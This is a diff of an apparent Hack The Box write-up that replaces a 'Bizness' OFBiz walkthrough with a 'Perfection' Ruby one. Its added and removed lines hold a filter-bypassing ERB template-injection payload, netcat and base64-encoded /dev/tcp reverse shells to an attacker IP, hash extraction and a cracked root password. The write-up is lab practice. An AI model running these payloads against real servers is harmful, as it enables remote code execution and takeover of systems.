@@ -9,12 +9,14 @@ Play Date:: 2024/05/20 - 2024/06/19
 
 A vulnerable Ruby web server hosted on Linux.
 
-== Methodology
+== Reconnaissance
 
 . Scan the web server ``10.10.11.253`` for open ports.
 . Find potential vulnerabilities.
+. Try to exploit them.
+. Get Flag.
 
-=== NMAP
+=== NMAP Scan
 
 Scan with nmap
 
@@ -144,206 +146,146 @@ This is a *Ruby HTTP server toolkit*.
 Now, that's a progress.
 
 I looked for exploits related to version *1.7.0* but the results on the web shows different versions and old as well.
+I didn't know what I was doing.
+I was lost.
+I didn't know what to look for.
+I searched and read more about attacks on web servers and I found what I needed, *Server Side Template Injection*.
+
+=== Server Side Template Injection
+
+Ruby got lots of templating engine but the common ones are *Embedded Ruby (ERB)* and *Slim*.
+I tried my luck with ERB by testing ``<%= Dir.entries('/') %>`` (which I found https://github.com/HackTricks-wiki/hacktricks/blob/master/pentesting-web/ssti-server-side-template-injection/README.md[here]).
+Of course that didn't work as I would just get this error:
+
+----
+Invalid query parameters: invalid %-encoding (&amp;lt;%= Dir.entries(&amp;#x2F;) %&amp;gt;)
+----
+
+I forgot to encode it...
+When encoded, the result is still the same.
+Giving a malicious input blocked.
+
+.Encoded SSTI
+----
+%3C%25%3D%20Dir.entries(%27%2F%27)%20%25%3E
+----
+
+Once again, I am back on having to deal with bypassing the sanitization.
+Apparently, all we have to do is add a ``%0A`` newline encoded character before the input.
+But for it to work, there should be at least one valid character before it.
+
+I didn't understand why that works.
+This will be explained later on.
+
+----
+a%0A%3C%25%3D%20Dir.entries(%27%2F%27)%20%25%3E <.>
+----
+<.> Added ``a%0A``.
+
+And we're able to show the results!
+
+.Working SSTI
+----
+$ curl 'http://10.10.11.253/weighted-grade-calc' --data-raw 'category1=a&grade1=10&weight1=10&category2=b&grade2=10&weight2=20&category3=c&grade3=10&weight3=30&category4=d&grade4=10&weight4=30&category5=a%0a%3C%25%3D%20Dir.entries(%27%2F%27)%20%25%3E&grade5=10&weight5=10' | grep -E "Your total grade is|Malicious input blocked" -A 2
+
+Your total grade is 10%<p>a: 1%</p><p>b: 2%</p><p>c: 3%</p><p>d: 3%</p><p>a
+["dev", "libx32", "srv", "lib", "usr", "bin", "lib64", "lost+found", "sys", "var", "media", "tmp", "proc", "boot", "home", "opt", "lib32", "sbin", "run", "etc", "mnt", "..", "root", "."]: 1%</p>
+    </div>
+----
+
+We can now create a reverse shell!
 
 
-=== Exploitation
+== Exploitation
 
-First create a connection for the reverse shell to connect to
+Before creating a reverse shell, I wanted to see if I can ping my host machine.
+
+.Check connection with tcpdump 
+----
+$ tcpdump -i tun0 -A icmp
+
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+----
+
+Then made a ping request.
+
+.ERB Ping Request
+----
+$ curl 'http://10.10.11.253/weighted-grade-calc' --data-raw 'category1=a&grade1=10&weight1=10&category2=b&grade2=10&weight2=20&category3=c&grade3=10&weight3=30&category4=d&grade4=10&weight4=30&category5=a%0A%3C%25%3D%20system(%27ping%20-c1%2010.10.16.11%27)%20%25%3E&grade5=10&weight5=10'
+----
+
+.Output of tcpdump after a ping request
+----
+20:37:26.149125 IP 10.10.11.253 > 10.10.16.11: ICMP echo request, id 6, seq 1, length 64
+E..T.N@.?.V?
+
+..
+
+..........w.tf....c....................... !"#$%&'()*+,-./01234567
+20:37:26.149149 IP 10.10.16.11 > 10.10.11.253: ICMP echo reply, id 6, seq 1, length 64
+E..T1...@...
+
+..
+
+..........w.tf....c....................... !"#$%&'()*+,-./01234567
+----
+
+Meaning, it's possible to connect from the web server to my machine!
+
+I then setup netcat for reverse shell.
 
 ----
 $ nc -lvnp 6969 <.>
+
+listening on [any] 6969 ...
 ----
 <.> Pick any port you like
 
-Then execute the exploit downloaded on another terminal
+I didn't like how I have to input the commands in the terminal so I made a Python script that will make a POST request to the server and make a reverse shell connection.
 
+[,python]
 ----
-$ python3 exploit.py --url https://bizness.htb --cmd 'nc -e /bin/bash 10.10.16.20 6969' <.>
-[+] Generating payload...
-[+] Payload generated successfully.
-[+] Sending malicious serialized payload...
-[+] The request has been successfully sent. Check the result of the command.
-----
-<.> Make sure to point the server to your machine's IP address
-
-On the netcat terminal, this should be printed on the screen
-
-----
-listening on [any] 6969 ...
-connect to [10.10.16.20] from (UNKNOWN) [10.10.11.252] 49924
+include::attachment$perfection/perfection.py[]
 ----
 
-And we're in!
-
-That can be verified with these commands
+The script is equivalent to executing
 
 ----
-$ whoami
-ofbiz
-$pwd
-/opt/ofbiz
+$ curl 'http://10.10.11.253/weighted-grade-calc' --data-raw 'category1=a&grade1=10&weight1=10&category2=b&grade2=10&weight2=20&category3=c&grade3=10&weight3=30&category4=d&grade4=10&weight4=30&category5=a%0A%3C%25%3D+system%28%22echo+%27MDwmMTk2OyBleGVjIDE5Njw%2BL2Rldi90Y3AvMTAuMTAuMTYuMTEvNjk2OTsgc2ggPCYxOTYgPiYxOTYgMj4mMTk2%27+%7C+base64+--decode+%7C+bash%22%29+%25%3E&grade5=10&weight5=10'
 ----
 
-== Finding The Flag
+.Reverse Shell Success
+image::perfection/reverse_shell.png[]
 
-The current directory apparently have tons of files and it would be difficult to find the root flag.
 
-Finding the user flag is quite easy, simply print it out
+=== User Flag
+
+Woops.
+Here's the user flag.
 
 ----
 $ cat ~/user.txt
-2ecc953f42e90c7a284fcab56f26867e
+
+a492e9d8a7e5c4d0cc14e27ce647d655
 ----
 
-As for the root flag, it's located in ``/root/root.txt`` however the current user (ofbiz) does not have permissions to read, write, and execute on that directory.
+=== Root Flag
 
-It's painful to dumpster dive the password of the root user.
-It's not located in the Dockerfile nor in the configurations.
-
-There is however an encrypted password in the file ``/opt/ofbiz/framework/resources/templates/AdminUserLoginData.xml``.
-
-[, xml]
-----
-$ cat AdminUserLoginData.xml
-
-<?xml version="1.0" encoding="UTF-8"?>
-<!--
-Licensed to the Apache Software Foundation (ASF) under one
-or more contributor license agreements.  See the NOTICE file
-distributed with this work for additional information
-regarding copyright ownership.  The ASF licenses this file
-to you under the Apache License, Version 2.0 (the
-"License"); you may not use this file except in compliance
-with the License.  You may obtain a copy of the License at
-
-http://www.apache.org/licenses/LICENSE-2.0
-
-Unless required by applicable law or agreed to in writing,
-software distributed under the License is distributed on an
-"AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
-KIND, either express or implied.  See the License for the
-specific language governing permissions and limitations
-under the License.
--->
-
-<entity-engine-xml>
-    <UserLogin userLoginId="@userLoginId@" currentPassword="{SHA}47ca69ebb4bdc9ae0adec130880165d2cc05db1a" requirePasswordChange="Y"/> <.>
-    <UserLoginSecurityGroup groupId="SUPER" userLoginId="@userLoginId@" fromDate="2001-01-01 12:00:00.0"/>
-</entity-engine-xml>
-----
-<.> This line contains a SHA password.
-
-However, I do not see any use or a way to crack the password.
-
-Upon further reading about Apache's OFBiz, the password is stored as plaintext as SHA hash somewhere in the ``./runtime/data`` directory.
-
-Since I am lazy, I proceeded to simply print the strings of each and every file that contains a *SHA*.
-
-----
-$ cd ./runtime/data/derby/ofbiz/seg0
-$ strings * | grep SHA
-
-SHA-256
-MARSHALL ISLANDS
-SHAREHOLDER
-SHAREHOLDER
-                <eeval-UserLogin createdStamp="2023-12-16 03:40:23.643" createdTxStamp="2023-12-16 03:40:23.445" currentPassword="$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I" enabled="Y" hasLoggedOut="N" lastUpdatedStamp="2023-12-16 03:44:54.272" lastUpdatedTxStamp="2023-12-16 03:44:54.213" requirePasswordChange="N" userLoginId="admin"/>
-"$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I <.>
-
-----
-<.> We found are root password hashed with SHA.
-
-== Cracking the Root Flag
-
-Certainly, I can code my own tool for cracking the hashed password using a wordlist dictionary but someone else have already created that tool for us to use.
-Can be accessed https://github.com/duck-sec/Apache-OFBiz-SHA1-Cracker[here].
-
-I used *rockyou.txt* as my wordlist.
-
-After cracking the SHA hash, we should now acquire the password.
-
-----
-monkeybizness
-----
-
-== Get Root Flag
-
-Login with root
-
-----
-$ su
-Password: monkeybizness
-----
-
-Check if we truly are root
-
-----
-# whoami
-root
-----
-
-Acquire the root flag
-
-----
-# cat /root/root.txt
-628643013da646b11a7f82adfd4f1b12
-----
+== Post-Exploitation
 
 == Challenge Summaries
 
-Extract the archive with ``tar``
-
-Use an existing tool to exploit Apache's OFBiz 18.12
-
-----
-$ python3 exploit.py --url https://bizness.htb --cmd 'nc -e /bin/bash 10.10.16.20 6969' <.>
-----
-
-Get the user flag
-
-----
-$ cat ~/user.txt
-2ecc953f42e90c7a284fcab56f26867e
-----
-
-Crack the SHA hash then get the root flag
-
-----
-$ cd ./runtime/data/derby/ofbiz/seg0
-$ strings * | grep SHA
-
-SHA-256
-MARSHALL ISLANDS
-SHAREHOLDER
-SHAREHOLDER
-                <eeval-UserLogin createdStamp="2023-12-16 03:40:23.643" createdTxStamp="2023-12-16 03:40:23.445" currentPassword="$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I" enabled="Y" hasLoggedOut="N" lastUpdatedStamp="2023-12-16 03:44:54.272" lastUpdatedTxStamp="2023-12-16 03:44:54.213" requirePasswordChange="N" userLoginId="admin"/>
-"$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I <.>
-----
-
-----
-$ su
-Password: monkeybizness
-----
-
-----
-# cat /root/root.txt
-628643013da646b11a7f82adfd4f1b12
-----
-
 == Lessons Learned
-
-. Apache's OFBiz
-. Searching for existing exploits
 
 == Conclusion
 
-Not a fun challenge when you have to search the files one by one when you do not have experience with OFBiz.
-I don't wanna do this shit again.
 
 [IMPORTANT] 
 .Flag
 ==== 
-user:2ecc953f42e90c7a284fcab56f26867e
+user:
 
-root:628643013da646b11a7f82adfd4f1b12
+root:
 ====
+
